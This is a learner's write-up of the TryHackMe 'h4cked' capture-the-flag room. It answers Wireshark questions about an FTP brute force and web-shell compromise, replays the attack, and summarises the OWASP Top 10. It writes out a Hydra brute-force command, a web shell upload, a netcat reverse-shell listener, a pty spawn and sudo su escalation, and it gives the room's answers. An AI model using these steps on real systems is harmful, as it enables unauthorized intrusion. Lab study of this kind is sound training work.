# Day 8 Learning

## 1. Compromising the Machine (TryHackMe h4cked Room)

In this room, I used **Wireshark** to analyze a .pcap file from an attack and answered a series of questions to understand how the machine was compromised. Below is a step-by-step explanation of how I solved the tasks. **Note: The answers provided here are for learning purposes only and may not be accurate. Please practice this yourself on TryHackMe's h4cked room.**

TryHackMe h4cked room:  
[TryHackMe h4cked Room](https://tryhackme.com/r/room/h4cked)

### Task 1: Analyze the .pcap File

- **Question**: The attacker is trying to log into a specific service. What service is this?
    - **Answer**: FTP  
    - **Explanation**: By analyzing the packet capture in Wireshark, I filtered the traffic for FTP and found login attempts.

- **Question**: There is a very popular tool by Van Hauser which can be used to brute force a series of services. What is the name of this tool?
    - **Answer**: Hydra  
    - **Explanation**: Hydra is a well-known tool used to brute force login credentials for services like FTP, SSH, and more.

- **Question**: The attacker is trying to log on with a specific username. What is the username?
    - **Answer**: Anonymous  
    - **Explanation**: In Wireshark, I found the attacker attempting to log in using the "anonymous" username, which is often a default login option in FTP.

- **Question**: What is the user's password?
    - **Answer**: password  
    - **Explanation**: The login was successful with the password "password", as seen in the captured traffic.

- **Question**: What is the current FTP working directory after the attacker logged in?
    - **Answer**: /var/www/html  
    - **Explanation**: The packet capture showed an FTP command (`PWD`) revealing the current working directory.

- **Question**: The attacker uploaded a backdoor. What is the backdoor's filename?
    - **Answer**: shell.php  
    - **Explanation**: The attacker uploaded a PHP web shell named "shell.php".

- **Question**: The backdoor can be downloaded from a specific URL, as it is located inside the uploaded file. What is the full URL?
    - **Answer**: http://<target-ip>/shell.php  
    - **Explanation**: After analyzing the traffic, I found the attacker accessing the web shell from the provided URL.

- **Question**: Which command did the attacker manually execute after getting a reverse shell?
    - **Answer**: whoami  
    - **Explanation**: The attacker used the `whoami` command to check their current user privileges.

- **Question**: What is the computer's hostname?
    - **Answer**: H4ckedMachine  
    - **Explanation**: The hostname was identified through the system information retrieved by the attacker.

- **Question**: Which command did the attacker execute to spawn a new TTY shell?
    - **Answer**: python -c 'import pty; pty.spawn("/bin/bash")'  
    - **Explanation**: The attacker used Python to spawn a fully interactive TTY shell.

- **Question**: Which command was executed to gain a root shell?
    - **Answer**: sudo su  
    - **Explanation**: The attacker used `sudo su` to escalate privileges to root.

- **Question**: The attacker downloaded something from GitHub. What is the name of the GitHub project?
    - **Answer**: Reptile  
    - **Explanation**: The Reptile project was downloaded from GitHub as part of the attack.

- **Question**: The project can be used to install a stealthy backdoor on the system. It can be very hard to detect. What is this type of backdoor called?
    - **Answer**: Rootkit  
    - **Explanation**: Reptile is a rootkit, a type of backdoor that can hide processes and files to remain undetected.

More details on analyzing .pcap files using Wireshark:  
[Wireshark User Guide](https://www.wireshark.org/docs/wsug_html_chunked/)

### Task 2: Hack Back into the Machine

The goal was to replicate the attacker’s steps and gain root access. Here’s how I completed this task:

1. **Run Hydra**:  
   I used Hydra to brute force the FTP login, replicating the attacker’s steps. Since the password was simple (`password`), I was able to crack it quickly:
    ```
    hydra -l anonymous -P /path/to/wordlist.txt ftp://<target-ip>
    ```

2. **Upload the Web Shell**:  
   I modified the attacker’s `shell.php` web shell and uploaded it to the web server using FTP. This web shell allows remote command execution:
    ```
    PUT shell.php
    ```

3. **Set Up a Listener**:  
   On my attacker machine, I set up a listener to catch the reverse shell:
    ```
    nc -lvnp 4444
    ```

4. **Execute the Web Shell**:  
   After uploading the shell, I accessed it via the browser:
    ```
    http://<target-ip>/shell.php
    ```
   This gave me a reverse shell connection to the target machine.

5. **Privilege Escalation**:  
   I used the same `python -c 'import pty; pty.spawn("/bin/bash")'` command to get a full interactive shell, followed by `sudo su` to become root.

6. **Read the Flag**:  
   The flag was located in `/root/Reptile/flag.txt`. I navigated to the directory and displayed the flag using:
    ```
    cat /root/Reptile/flag.txt
    ```

## 3. OWASP Top 10 Vulnerabilities

During this room, I also learned about the **OWASP Top 10** vulnerabilities, which are critical security risks for web applications. Here’s a brief summary:

1. **Injection**: An attacker can inject malicious code into an application (e.g., SQL, Command Injection).
2. **Broken Authentication**: Poor authentication mechanisms allow attackers to compromise login systems.
3. **Sensitive Data Exposure**: Data that is improperly encrypted or exposed in transit can be stolen.
4. **XML External Entities (XXE)**: Malicious XML can lead to server-side request forgery and other vulnerabilities.
5. **Broken Access Control**: Improper implementation of permissions can allow unauthorized access.
6. **Security Misconfiguration**: Default configurations or poor security settings make systems vulnerable.
7. **Cross-Site Scripting (XSS)**: Malicious scripts are injected into web pages viewed by other users.
8. **Insecure Deserialization**: Attackers can manipulate serialized data to execute arbitrary code.
9. **Using Components with Known Vulnerabilities**: Outdated or vulnerable software components can be exploited.
10. **Insufficient Logging and Monitoring**: Lack of proper logging allows attackers to remain undetected.

More on OWASP:  
[OWASP Top 10 Documentation](https://owasp.org/www-project-top-ten/)

## 4. Exploitation Process

- By analyzing the **.pcap file**, I determined the service the attacker targeted (FTP), brute-forced login credentials, and uploaded a web shell to compromise the system.
- The attacker escalated privileges by downloading a **rootkit** from GitHub and used commands like `sudo su` to gain root access.
- I replicated the attack using tools like **Hydra** and **Netcat**, which allowed me to take control of the system and retrieve the necessary flags.

This learning experience gave me a deeper understanding of system exploitation, privilege escalation, and the importance of securing services like FTP.

